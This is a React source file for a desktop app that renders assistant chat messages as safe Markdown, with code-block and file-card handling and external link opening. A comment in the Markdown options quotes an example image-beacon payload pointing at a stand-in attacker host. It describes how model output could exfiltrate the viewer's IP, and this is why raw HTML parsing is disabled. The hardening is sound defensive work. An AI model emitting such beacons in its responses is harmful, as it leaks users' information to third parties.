// Safe markdown rendering for assistant messages. Uses markdown-to-jsx
// (~6KB, no transitive deps, returns React elements — never injects raw HTML)
// and overrides code rendering so fenced blocks get a language label + copy
// button via <CodeBlock>, while inline `code` stays compact.
//
// Visual styling for headings/lists/links/tables/quotes lives under the
// `.cad-md` scope in styles.css.

import Markdown from "markdown-to-jsx";
import type { MouseEvent, ReactNode } from "react";
import CodeBlock from "./CodeBlock";
import FileCard from "./FileCard";
import { openExternal } from "../lib/openExternal";

/** Flatten a ReactNode tree to its text content (for code extraction). */
function nodeToString(node: ReactNode): string {
  if (node == null || node === false || node === true) return "";
  if (typeof node === "string") return node;
  if (typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(nodeToString).join("");
  const el = node as { props?: { children?: ReactNode } };
  if (el?.props?.children != null) return nodeToString(el.props.children);
  return "";
}

/** Inline `code` spans only. Fenced blocks are handled by `PreBlock` below —
 *  the `<pre>` wrapper is the authoritative block signal, so we don't have to
 *  guess from content (a one-line fenced block with no language is still a
 *  block; a newline inside an inline span is still inline). */
function InlineCode({ children }: { children?: ReactNode }) {
  return (
    <code className="rounded bg-ink-700/60 px-1 py-0.5 font-mono text-[0.85em] text-accent">
      {children}
    </code>
  );
}

/** Fenced code block. markdown-to-jsx wraps fenced code as <pre><code lang-x>…>;
 *  we read the language + text off the inner <code> and render <CodeBlock>. */
function PreBlock({ children }: { children?: ReactNode }) {
  const inner = children as { props?: { className?: string; children?: ReactNode } } | undefined;
  const lang = inner?.props?.className?.replace(/^lang-/, "") || "";
  const text = nodeToString(inner?.props?.children ?? children).replace(/\n$/, "");
  // A `cad-file` fence is a file Atlas shared (RTS-110) — render it as a
  // file/image/video card instead of a code block.
  if (lang === "cad-file") return <FileCard raw={text} />;
  return <CodeBlock code={text} lang={lang} />;
}

export default function MarkdownView({ children }: { children: string }) {
  // Intercept link clicks so they open in the system browser instead of
  // navigating the app window (critical in the Tauri webview).
  function onClick(e: MouseEvent<HTMLDivElement>) {
    const anchor = (e.target as HTMLElement).closest("a");
    const href = anchor?.getAttribute("href");
    if (href && /^https?:\/\//i.test(href)) {
      e.preventDefault();
      void openExternal(href);
    }
  }
  return (
    <div className="cad-md text-sm leading-relaxed text-zinc-200" onClick={onClick}>
      <Markdown
        options={{
          forceBlock: true,
          // Assistant/tool output is 100% untrusted. We render Markdown, not
          // HTML — so disable raw-HTML parsing entirely. This removes the
          // <img>-beacon / CSS-injection surface (a model can otherwise emit
          // `<img src="http://attacker/collect?…">` to exfiltrate the viewer's
          // IP/referrer) on top of the library's javascript:/vbscript: filter.
          disableParsingRawHTML: true,
          overrides: {
            pre: { component: PreBlock },
            code: { component: InlineCode },
            a: { props: { target: "_blank", rel: "noreferrer noopener" } },
          },
        }}
      >
        {children}
      </Markdown>
    </div>
  );
}
